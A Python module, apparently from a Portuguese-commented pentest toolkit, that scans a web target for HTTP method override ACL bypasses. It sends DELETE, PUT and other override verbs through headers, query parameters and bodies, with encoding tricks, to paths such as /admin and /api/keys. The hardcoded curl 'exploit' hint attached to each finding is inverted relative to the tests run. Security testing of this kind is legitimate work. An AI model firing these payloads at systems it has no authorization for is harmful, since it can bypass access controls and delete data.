#!/usr/bin/env python3

"""Modulo de deteccao de HTTP Method Override.



Testa se o servidor aceita bypass de ACL via:

  - Header — X-HTTP-Method-Override, X-HTTP-Method, X-Method-Override

  - Param — _method, __method, method em query/body

  - Body — _method no body form/JSON

  - Bypass — encoding, case, double override

  - Verb — DELETE, PUT, PATCH, OPTIONS via override



Fluxo:

  1. Envia request baseline (GET) para detectar resposta de referencia

  2. Envia requests com method override em header/param/body

  3. Verifica se resposta indica bypass (200 em vez de 403)

  4. Classifica: vulnerable, blocked, error

  5. Retorna resultado consolidado com severidade

"""

import argparse
import json
import logging
from dataclasses import asdict, dataclass

import httpx

from mytools.core.utils import (
    Cyber,
    add_common_args,
    color,
    create_async_client,
    create_banner,
    print_exploit_info,
    run_main_loop,
    safe_asyncio_run,
    write_output,
)

logger = logging.getLogger("mytools.methodoverride")


_CATEGORY_MAP_DEFAULT: dict[str, list[str]] = {
    "header": [
        "x_method_override",
        "x_http_method",
        "x_method",
        "x_http_method_override",
        "custom_header",
    ],
    "param": [
        "underscore_method",
        "double_underscore",
        "method_param",
        "override_param",
        "m_param",
    ],
    "body": [
        "json_method",
        "form_method",
        "xml_method",
        "json_override",
        "form_override",
    ],
    "bypass": [
        "case_mixed",
        "double_encode",
        "null_terminate",
        "unicode_method",
        "whitespace",
    ],
    "verb": [
        "delete_via_get",
        "put_via_get",
        "patch_via_get",
        "options_via_get",
        "trace_via_get",
    ],
}


def _load_category_map() -> dict[str, list[str]]:

    from mytools.data import load_payloads

    data = load_payloads(
        "web", "methodoverride", default={"category_map": _CATEGORY_MAP_DEFAULT}
    )

    return data.get("category_map", _CATEGORY_MAP_DEFAULT)


_CATEGORY_MAP = _load_category_map()
_HEADER_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
    (
        "x_method_override",
        "X-HTTP-Method-Override",
        "DELETE",
        ["x-http-method-override", "method", "override"],
    ),
    (
        "x_http_method",
        "X-HTTP-Method",
        "DELETE",
        ["x-http-method", "method", "override"],
    ),
    (
        "x_method",
        "X-Method-Override",
        "DELETE",
        ["x-method-override", "method", "override"],
    ),
    (
        "x_http_method_override",
        "X-HTTP-Method-Override",
        "PUT",
        ["x-http-method-override", "method", "override"],
    ),
    (
        "custom_header",
        "X-Custom-HTTP-Method",
        "DELETE",
        ["method", "override"],
    ),
]


def _load_header_payloads() -> list[tuple[str, str, str, list[str]]]:

    from mytools.data import load_payloads

    data = load_payloads(
        "web",
        "methodoverride",
        default={"header_payloads": [list(t) for t in _HEADER_PAYLOADS_DEFAULT]},
    )

    return [
        tuple(x)
        for x in data.get(
            "header_payloads", [list(t) for t in _HEADER_PAYLOADS_DEFAULT]
        )
    ]


_HEADER_PAYLOADS = _load_header_payloads()


_PARAM_PAYLOADS_DEFAULT: list[tuple[str, str, str, str, list[str]]] = [
    (
        "underscore_method",
        "_method",
        "DELETE",
        "query",
        ["_method", "method", "override"],
    ),
    (
        "double_underscore",
        "__method",
        "DELETE",
        "query",
        ["__method", "method", "override"],
    ),
    (
        "method_param",
        "method",
        "DELETE",
        "query",
        ["method", "override"],
    ),
    (
        "override_param",
        "override",
        "DELETE",
        "query",
        ["override", "method"],
    ),
    (
        "m_param",
        "_method",
        "PUT",
        "query",
        ["_method", "method", "override"],
    ),
]


def _load_param_payloads() -> list[tuple[str, str, str, str, list[str]]]:

    from mytools.data import load_payloads

    data = load_payloads(
        "web",
        "methodoverride",
        default={"param_payloads": [list(t) for t in _PARAM_PAYLOADS_DEFAULT]},
    )

    return [
        tuple(x)
        for x in data.get("param_payloads", [list(t) for t in _PARAM_PAYLOADS_DEFAULT])
    ]


_PARAM_PAYLOADS = _load_param_payloads()


_BODY_PAYLOADS_DEFAULT: list[tuple[str, str, str, str, list[str]]] = [
    (
        "json_method",
        "_method",
        "DELETE",
        "json",
        ["_method", "method", "override"],
    ),
    (
        "form_method",
        "_method",
        "DELETE",
        "form",
        ["_method", "method", "override"],
    ),
    (
        "xml_method",
        "method",
        "DELETE",
        "xml",
        ["method", "override"],
    ),
    (
        "json_override",
        "X-HTTP-Method-Override",
        "DELETE",
        "json",
        ["method", "override"],
    ),
    (
        "form_override",
        "X-HTTP-Method-Override",
        "DELETE",
        "form",
        ["method", "override"],
    ),
]


def _load_body_payloads() -> list[tuple[str, str, str, str, list[str]]]:

    from mytools.data import load_payloads

    data = load_payloads(
        "web",
        "methodoverride",
        default={"body_payloads": [list(t) for t in _BODY_PAYLOADS_DEFAULT]},
    )

    return [
        tuple(x)
        for x in data.get("body_payloads", [list(t) for t in _BODY_PAYLOADS_DEFAULT])
    ]


_BODY_PAYLOADS = _load_body_payloads()


_BYPASS_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
    (
        "case_mixed",
        "X-Http-Method-Override",
        "DELETE",
        ["method", "override"],
    ),
    (
        "double_encode",
        "X-HTTP-Method-Override",
        "DELETE%20",
        ["method", "override"],
    ),
    (
        "null_terminate",
        "X-HTTP-Method-Override",
        "DELETE%00",
        ["method", "override"],
    ),
    (
        "unicode_method",
        "X-HTTP-Method-Override",
        "DELETE\u200b",
        ["method", "override"],
    ),
    (
        "whitespace",
        "X-HTTP-Method-Override",
        " DELETE ",
        ["method", "override"],
    ),
]


def _load_bypass_payloads() -> list[tuple[str, str, str, list[str]]]:

    from mytools.data import load_payloads

    data = load_payloads(
        "web",
        "methodoverride",
        default={"bypass_payloads": [list(t) for t in _BYPASS_PAYLOADS_DEFAULT]},
    )

    return [
        tuple(x)
        for x in data.get(
            "bypass_payloads", [list(t) for t in _BYPASS_PAYLOADS_DEFAULT]
        )
    ]


_BYPASS_PAYLOADS = _load_bypass_payloads()


_VERB_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
    (
        "delete_via_get",
        "X-HTTP-Method-Override",
        "DELETE",
        ["200", "201", "204", "deleted"],
    ),
    (
        "put_via_get",
        "X-HTTP-Method-Override",
        "PUT",
        ["200", "201", "204", "updated"],
    ),
    (
        "patch_via_get",
        "X-HTTP-Method-Override",
        "PATCH",
        ["200", "201", "204", "patched"],
    ),
    (
        "options_via_get",
        "X-HTTP-Method-Override",
        "OPTIONS",
        ["200", "204", "allow"],
    ),
    (
        "trace_via_get",
        "X-HTTP-Method-Override",
        "TRACE",
        ["200", "204"],
    ),
]


def _load_verb_payloads() -> list[tuple[str, str, str, list[str]]]:

    from mytools.data import load_payloads

    data = load_payloads(
        "web",
        "methodoverride",
        default={"verb_payloads": [list(t) for t in _VERB_PAYLOADS_DEFAULT]},
    )

    return [
        tuple(x)
        for x in data.get("verb_payloads", [list(t) for t in _VERB_PAYLOADS_DEFAULT])
    ]


_VERB_PAYLOADS = _load_verb_payloads()


_SENSITIVE_PATHS_DEFAULT: list[str] = [
    "/admin",
    "/secret",
    "/dashboard",
    "/settings",
    "/api/keys",
    "/api/users",
    "/internal",
    "/debug",
    "/config",
    "/admin/users",
]


def _load_sensitive_paths() -> list[str]:

    from mytools.data import load_payloads

    data = load_payloads(
        "web", "methodoverride", default={"sensitive_paths": _SENSITIVE_PATHS_DEFAULT}
    )

    return data.get("sensitive_paths", _SENSITIVE_PATHS_DEFAULT)


_SENSITIVE_PATHS = _load_sensitive_paths()


@dataclass(frozen=True, slots=True)
class OverrideAttempt:
    """Tentativa individual de HTTP Method Override."""

    technique: str

    category: str

    header_name: str

    header_value: str

    method: str

    status_baseline: int

    status_test: int

    size_baseline: int

    size_test: int

    status_changed: bool

    size_changed: bool

    vulnerable: bool

    details: str

    error: str

    exploit: str = ""

    tool: str = ""


@dataclass(frozen=True, slots=True)
class OverrideResult:
    """Resultado consolidado do scan de HTTP Method Override."""

    target: str

    baseline_status: int

    baseline_size: int

    tls: bool

    attempts: list[OverrideAttempt]

    vulnerable_techniques: list[str]

    blocked_techniques: list[str]

    issues: list[str]

    overall_status: str


def _check_override_response(
    body: bytes,
    status: int,
    baseline_status: int,
) -> bool:
    """Verifica se a resposta indica method override aceito.



    Se baseline foi 403/401 e a resposta agora e 200/201/204,

    indica bypass de ACL via method override.

    """

    if status == 0:
        return False

    if baseline_status in (403, 401, 405) and status in (200, 201, 204):
        return True

    return status in (200, 201, 204) and status != baseline_status


def _check_response_content(body: bytes, indicators: list[str]) -> bool:
    """Verifica se o conteudo da resposta contem indicadores de sucesso."""

    text = body.decode("utf-8", errors="ignore").lower()

    return any(ind.lower() in text for ind in indicators)


async def _test_baseline(client: httpx.AsyncClient, url: str) -> tuple[int, int, bytes]:
    """Envia request baseline para obter status e tamanho de referencia."""

    try:
        resp = await client.get(url, follow_redirects=True)

        return resp.status_code, len(resp.content), resp.content

    except httpx.RequestError:
        return 0, 0, b""


async def _test_header(
    client: httpx.AsyncClient,
    url: str,
    baseline: tuple[int, int, bytes],
) -> list[OverrideAttempt]:
    """Testa payloads de header method override."""

    b_status, b_size, _ = baseline

    results: list[OverrideAttempt] = []

    for technique, header_name, header_value, indicators in _HEADER_PAYLOADS:
        for path in _SENSITIVE_PATHS[:4]:
            try:
                test_url = url.rstrip("/") + path

                resp = await client.get(
                    test_url,
                    headers={header_name: header_value},
                    follow_redirects=True,
                )

                vulnerable = _check_override_response(
                    resp.content, resp.status_code, b_status
                )

                if vulnerable:
                    vulnerable = _check_response_content(resp.content, indicators)

                results.append(
                    OverrideAttempt(
                        exploit="curl -X DELETE -H 'X-HTTP-Method-Override: GET' <TARGET>",
                        tool="curl",
                        technique=technique,
                        category="header",
                        header_name=header_name,
                        header_value=header_value,
                        method="GET",
                        status_baseline=b_status,
                        status_test=resp.status_code,
                        size_baseline=b_size,
                        size_test=len(resp.content),
                        status_changed=resp.status_code != b_status,
                        size_changed=len(resp.content) != b_size,
                        vulnerable=vulnerable,
                        details=f"path={path}, header={header_name}: {header_value}"
                        if vulnerable
                        else "",
                        error="",
                    )
                )

            except httpx.RequestError as e:
                results.append(
                    OverrideAttempt(
                        technique=technique,
                        category="header",
                        header_name=header_name,
                        header_value=header_value,
                        method="GET",
                        status_baseline=b_status,
                        status_test=0,
                        size_baseline=b_size,
                        size_test=0,
                        status_changed=False,
                        size_changed=False,
                        vulnerable=False,
                        details="",
                        error=str(e)[:100],
                    )
                )

    return results


async def _test_param(
    client: httpx.AsyncClient,
    url: str,
    baseline: tuple[int, int, bytes],
) -> list[OverrideAttempt]:
    """Testa payloads de query parameter method override."""

    b_status, b_size, _ = baseline

    results: list[OverrideAttempt] = []

    for technique, param_name, param_value, _, indicators in _PARAM_PAYLOADS:
        for path in _SENSITIVE_PATHS[:4]:
            try:
                test_url = url.rstrip("/") + path + f"?{param_name}={param_value}"

                resp = await client.get(test_url, follow_redirects=True)

                vulnerable = _check_override_response(
                    resp.content, resp.status_code, b_status
                )

                if vulnerable:
                    vulnerable = _check_response_content(resp.content, indicators)

                results.append(
                    OverrideAttempt(
                        exploit="curl -X DELETE -H 'X-HTTP-Method-Override: GET' <TARGET>",
                        tool="curl",
                        technique=technique,
                        category="param",
                        header_name=param_name,
                        header_value=param_value,
                        method="GET",
                        status_baseline=b_status,
                        status_test=resp.status_code,
                        size_baseline=b_size,
                        size_test=len(resp.content),
                        status_changed=resp.status_code != b_status,
                        size_changed=len(resp.content) != b_size,
                        vulnerable=vulnerable,
                        details=f"path={path}, param={param_name}={param_value}"
                        if vulnerable
                        else "",
                        error="",
                    )
                )

            except httpx.RequestError as e:
                results.append(
                    OverrideAttempt(
                        technique=technique,
                        category="param",
                        header_name=param_name,
                        header_value=param_value,
                        method="GET",
                        status_baseline=b_status,
                        status_test=0,
                        size_baseline=b_size,
                        size_test=0,
                        status_changed=False,
                        size_changed=False,
                        vulnerable=False,
                        details="",
                        error=str(e)[:100],
                    )
                )

    return results


async def _test_body(
    client: httpx.AsyncClient,
    url: str,
    baseline: tuple[int, int, bytes],
) -> list[OverrideAttempt]:
    """Testa payloads de body method override."""

    b_status, b_size, _ = baseline

    results: list[OverrideAttempt] = []

    for (
        technique,
        field_name,
        override_method,
        content_type,
        indicators,
    ) in _BODY_PAYLOADS:
        for path in _SENSITIVE_PATHS[:4]:
            try:
                test_url = url.rstrip("/") + path

                if content_type == "json":
                    body = json.dumps({field_name: override_method})

                    headers = {"Content-Type": "application/json"}

                elif content_type == "form":
                    body = f"{field_name}={override_method}"

                    headers = {"Content-Type": "application/x-www-form-urlencoded"}

                else:
                    body = (
                        f"<root><{field_name}>{override_method}</{field_name}></root>"
                    )

                    headers = {"Content-Type": "application/xml"}

                resp = await client.post(
                    test_url,
                    content=body,
                    headers=headers,
                    follow_redirects=True,
                )

                vulnerable = _check_override_response(
                    resp.content, resp.status_code, b_status
                )

                if vulnerable:
                    vulnerable = _check_response_content(resp.content, indicators)

                results.append(
                    OverrideAttempt(
                        exploit="curl -X DELETE -H 'X-HTTP-Method-Override: GET' <TARGET>",
                        tool="curl",
                        technique=technique,
                        category="body",
                        header_name=field_name,
                        header_value=override_method,
                        method="POST",
                        status_baseline=b_status,
                        status_test=resp.status_code,
                        size_baseline=b_size,
                        size_test=len(resp.content),
                        status_changed=resp.status_code != b_status,
                        size_changed=len(resp.content) != b_size,
                        vulnerable=vulnerable,
                        details=f"path={path}, {content_type}={field_name}={override_method}"
                        if vulnerable
                        else "",
                        error="",
                    )
                )

            except httpx.RequestError as e:
                results.append(
                    OverrideAttempt(
                        technique=technique,
                        category="body",
                        header_name=field_name,
                        header_value=override_method,
                        method="POST",
                        status_baseline=b_status,
                        status_test=0,
                        size_baseline=b_size,
                        size_test=0,
                        status_changed=False,
                        size_changed=False,
                        vulnerable=False,
                        details="",
                        error=str(e)[:100],
                    )
                )

    return results


async def _test_bypass(
    client: httpx.AsyncClient,
    url: str,
    baseline: tuple[int, int, bytes],
) -> list[OverrideAttempt]:
    """Testa bypass de method override (encoding, case, etc)."""

    b_status, b_size, _ = baseline

    results: list[OverrideAttempt] = []

    for technique, header_name, header_value, indicators in _BYPASS_PAYLOADS:
        for path in _SENSITIVE_PATHS[:4]:
            try:
                test_url = url.rstrip("/") + path

                resp = await client.get(
                    test_url,
                    headers={header_name: header_value},
                    follow_redirects=True,
                )

                vulnerable = _check_override_response(
                    resp.content, resp.status_code, b_status
                )

                if vulnerable:
                    vulnerable = _check_response_content(resp.content, indicators)

                results.append(
                    OverrideAttempt(
                        exploit="curl -X DELETE -H 'X-HTTP-Method-Override: GET' <TARGET>",
                        tool="curl",
                        technique=technique,
                        category="bypass",
                        header_name=header_name,
                        header_value=header_value,
                        method="GET",
                        status_baseline=b_status,
                        status_test=resp.status_code,
                        size_baseline=b_size,
                        size_test=len(resp.content),
                        status_changed=resp.status_code != b_status,
                        size_changed=len(resp.content) != b_size,
                        vulnerable=vulnerable,
                        details=f"path={path}, bypass={header_name}: {header_value!r}"
                        if vulnerable
                        else "",
                        error="",
                    )
                )

            except Exception as e:
                results.append(
                    OverrideAttempt(
                        technique=technique,
                        category="bypass",
                        header_name=header_name,
                        header_value=header_value,
                        method="GET",
                        status_baseline=b_status,
                        status_test=0,
                        size_baseline=b_size,
                        size_test=0,
                        status_changed=False,
                        size_changed=False,
                        vulnerable=False,
                        details="",
                        error=str(e)[:100],
                    )
                )

    return results


async def _test_verb(
    client: httpx.AsyncClient,
    url: str,
    baseline: tuple[int, int, bytes],
) -> list[OverrideAttempt]:
    """Testa envio de verbos diferentes via override."""

    b_status, b_size, _ = baseline

    results: list[OverrideAttempt] = []

    for technique, header_name, override_method, indicators in _VERB_PAYLOADS:
        for path in _SENSITIVE_PATHS[:4]:
            try:
                test_url = url.rstrip("/") + path

                resp = await client.get(
                    test_url,
                    headers={header_name: override_method},
                    follow_redirects=True,
                )

                vulnerable = _check_override_response(
                    resp.content, resp.status_code, b_status
                )

                if vulnerable:
                    vulnerable = _check_response_content(resp.content, indicators)

                results.append(
                    OverrideAttempt(
                        exploit="curl -X DELETE -H 'X-HTTP-Method-Override: GET' <TARGET>",
                        tool="curl",
                        technique=technique,
                        category="verb",
                        header_name=header_name,
                        header_value=override_method,
                        method=f"GET->{override_method}",
                        status_baseline=b_status,
                        status_test=resp.status_code,
                        size_baseline=b_size,
                        size_test=len(resp.content),
                        status_changed=resp.status_code != b_status,
                        size_changed=len(resp.content) != b_size,
                        vulnerable=vulnerable,
                        details=f"path={path}, verb={override_method}"
                        if vulnerable
                        else "",
                        error="",
                    )
                )

            except httpx.RequestError as e:
                results.append(
                    OverrideAttempt(
                        technique=technique,
                        category="verb",
                        header_name=header_name,
                        header_value=override_method,
                        method=f"GET->{override_method}",
                        status_baseline=b_status,
                        status_test=0,
                        size_baseline=b_size,
                        size_test=0,
                        status_changed=False,
                        size_changed=False,
                        vulnerable=False,
                        details="",
                        error=str(e)[:100],
                    )
                )

    return results


def print_results(result: OverrideResult) -> None:
    """Exibe os resultados do scan de HTTP Method Override."""

    vuln = [a for a in result.attempts if a.vulnerable]

    blocked = [a for a in result.attempts if not a.vulnerable and not a.error]

    errors = [a for a in result.attempts if a.error]

    print(color("\n--- HTTP Method Override ---", Cyber.CYAN, Cyber.BOLD))

    print(color(f"  Alvo:         {result.target}", Cyber.WHITE))

    print(color(f"  TLS:          {'sim' if result.tls else 'nao'}", Cyber.WHITE))

    print(
        color(
            f"  Baseline:     {result.baseline_status} ({result.baseline_size} bytes)",
            Cyber.WHITE,
        )
    )

    print(color(f"  Testes:       {len(result.attempts)}", Cyber.WHITE))

    print(color(f"  Vulneraveis:  {len(vuln)}", Cyber.GREEN if vuln else Cyber.GRAY))

    print(color(f"  Bloqueados:   {len(blocked)}", Cyber.GRAY))

    print(color(f"  Erros:        {len(errors)}", Cyber.RED if errors else Cyber.GRAY))

    if vuln:
        print(color("\n  [+] Vulnerabilidades detectadas:", Cyber.GREEN, Cyber.BOLD))

        seen: set[str] = set()

        for a in vuln:
            key = f"{a.technique}:{a.header_name}"

            if key in seen:
                continue

            seen.add(key)

            print(color(f"    [{a.category}] {a.technique}", Cyber.GREEN))

            print(
                color(f"      Header: {a.header_name}: {a.header_value}", Cyber.WHITE)
            )

            print(
                color(
                    f"      Status: {a.status_baseline} -> {a.status_test}", Cyber.WHITE
                )
            )

            if a.details:
                print(color(f"      Detalhes: {a.details}", Cyber.GRAY))

            print_exploit_info(a.exploit, a.tool)

        print(
            color(
                f"\n  Total: {len(result.attempts)} testes, {len(vuln)} vulneraveis",
                Cyber.WHITE,
            )
        )

    else:
        print(color("\n  [-] Nenhuma Method Override detectada", Cyber.YELLOW))

    if result.issues:
        print(color("\n  [!] Observacoes:", Cyber.YELLOW))

        for issue in result.issues:
            print(color(f"    - {issue}", Cyber.YELLOW))


async def run_scan(
    target: str,
    categories: list[str],
    timeout: float,
    output_file: str | None,
) -> int:
    """Executa o scan de HTTP Method Override."""

    logger.info("HTTP Method Override scan para %s", target)

    tls = target.startswith("https://")

    async with create_async_client(timeout=timeout) as client:
        baseline = await _test_baseline(client, target)

        b_status, b_size, _ = baseline

        all_attempts: list[OverrideAttempt] = []

        test_categories = categories if categories else list(_CATEGORY_MAP.keys())

        for cat in test_categories:
            if cat == "header":
                all_attempts.extend(await _test_header(client, target, baseline))

            elif cat == "param":
                all_attempts.extend(await _test_param(client, target, baseline))

            elif cat == "body":
                all_attempts.extend(await _test_body(client, target, baseline))

            elif cat == "bypass":
                all_attempts.extend(await _test_bypass(client, target, baseline))

            elif cat == "verb":
                all_attempts.extend(await _test_verb(client, target, baseline))

        vuln_techs = list({a.technique for a in all_attempts if a.vulnerable})

        blocked_techs = list(
            {a.technique for a in all_attempts if not a.vulnerable and not a.error}
        )

        issues: list[str] = []

        if not vuln_techs and not blocked_techs:
            issues.append("Nenhum teste retornou resultado claro")

        result = OverrideResult(
            target=target,
            baseline_status=b_status,
            baseline_size=b_size,
            tls=tls,
            attempts=all_attempts,
            vulnerable_techniques=vuln_techs,
            blocked_techniques=blocked_techs,
            issues=issues,
            overall_status="vulnerable"
            if vuln_techs
            else ("safe" if blocked_techs else "unknown"),
        )

        print_results(result)

        logger.info(
            "Method Override scan concluido: %d testes, %d vulneraveis",
            len(all_attempts),
            len(vuln_techs),
        )

        if output_file:
            write_output(output_file, asdict(result))

            logger.info("Resultados salvos em %s", output_file)

        return 1 if vuln_techs else 0


def banner_art() -> None:
    """Exibe a banner do modulo."""

    art = r"""

    __  __  ___  ____  ___  _   _ _____ ___  ____  __  __

   |  \/  |/ _ \|  _ \/ _ \| \ | |  ___/ _ \|  _ \|  \/  |

   | |\/| | | | | |_) | | | |  \| | |_ | | | | | | | |\/| |

   | |  | | |_| |  _ <| |_| | |\  |  _|| |_| | |_| | |  | |

   |_|  |_|\___/|_| \_\\___/|_| \_|_|   \___/|____/|_|  |_|

"""

    create_banner(art, "   http method override: header, param, body, bypass, verb")()


def build_parser() -> argparse.ArgumentParser:
    """Construtor do parser de argumentos."""

    parser = argparse.ArgumentParser(
        prog="mytools-methodoverride",
        description="HTTP Method Override — detecta bypass de ACL via headers/params/body.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Exemplos:\n"
            "  mytools-methodoverride https://target.com\n"
            "  mytools-methodoverride https://target.com -c header\n"
            "  mytools-methodoverride https://target.com -c bypass\n"
            "  mytools-methodoverride https://target.com --proxy http://127.0.0.1:8080"
        ),
    )

    parser.add_argument("url", help="URL alvo para o scan")

    parser.add_argument(
        "-c",
        "--category",
        default="all",
        choices=["all", "header", "param", "body", "bypass", "verb"],
        help="Categoria de testes (default: todas)",
    )

    add_common_args(parser, "web")

    return parser


def run_once(args: argparse.Namespace) -> int:
    """Executa um scan Method Override a partir de argumentos parseados."""

    logger.info("HTTP Method Override scan iniciado para %s", args.url)

    categories: list[str] = []

    if getattr(args, "category", None) and args.category != "all":
        categories = [args.category]

    return safe_asyncio_run(
        run_scan(
            target=args.url,
            categories=categories,
            timeout=getattr(args, "timeout", 10),
            output_file=getattr(args, "output", None),
        ),
    )


def main() -> int:
    """Entry point do modulo Method Override."""

    return run_main_loop(
        parser=build_parser(),
        banner_fn=banner_art,
        run_fn=run_once,
        has_target=lambda a: bool(
            getattr(a, "url", None) or getattr(a, "target", None)
        ),
        prompt="methodoverride> ",
        description="HTTP Method Override interativo.",
        example="https://target.com -c header",
        contextual_help=(
            "Uso: <url> [opcoes]\n"
            "Exemplos:\n"
            "  https://target.com\n"
            "  https://target.com -c header\n"
            "  https://target.com -c bypass\n"
            "  https://target.com -c verb\n"
            "  https://target.com --proxy http://127.0.0.1:8080"
        ),
    )


if __name__ == "__main__":
    raise SystemExit(main())
